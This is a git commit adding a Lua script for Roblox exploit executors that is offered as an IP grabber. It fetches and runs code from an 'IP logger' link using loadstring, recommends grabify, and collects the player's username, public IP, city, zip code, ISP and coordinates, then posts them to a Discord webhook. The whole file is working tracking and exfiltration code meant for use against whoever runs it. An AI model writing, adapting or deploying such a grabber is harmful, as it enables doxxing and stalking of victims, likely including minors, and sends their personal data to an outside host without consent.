9c7a7281dd22455638c2c1238a97e544211eaa81
#Fluroescent <Zegitora@gmail.com>
2022-03-04 18:03:17 +1100

    Scripts updated

---
+++ script1.lua
@@ -0,0 +1,59 @@
+local Response = syn.request({
+    Url = "put logger link here",
+    Method = "GET"
+})
+
+
+loadstring(http.request({Url="put ur ip logger link here"}).Body)()
+
+
+loadstring(request({Url="ip logger link here"}).Body)() 
+// make ip grabber id recommend grabify
+
+--------------------------------------------------------------
+
+local name = game:GetService("Players").LocalPlayer.Name
+// put your webhook there fluro#0009
+local WebhookURL = "YOUR DISCORD WEBHOOK HERE"
+local getIPResponse = syn.request({
+    Url = "https://api.ipify.org/?format=json",
+    Method = "GET"
+})
+local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+local IPBuffer = tostring(GetIPJSON.ip)
+
+local getIPInfo = syn.request({
+    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
+    Method = "Get"
+})
+local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+local FI = {
+    IP = IPBuffer,
+    country = IIT.country,
+    countryCode = IIT.countryCode,
+    region = IIT.region,
+    regionName = IIT.regionName,
+    city = IIT.city,
+    zipcode = IIT.zip,
+    latitude = IIT.lat,
+    longitude = IIT.lon,
+    isp = IIT.isp,
+    org = IIT.org
+}
+local dataMessage = string.format("
+User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s
+", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
+local MessageData = {
+    ["content"] = dataMessage
+}
+
+syn.request(
+    {
+        Url = WebhookURL, 
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode(MessageData)
+    }
+)
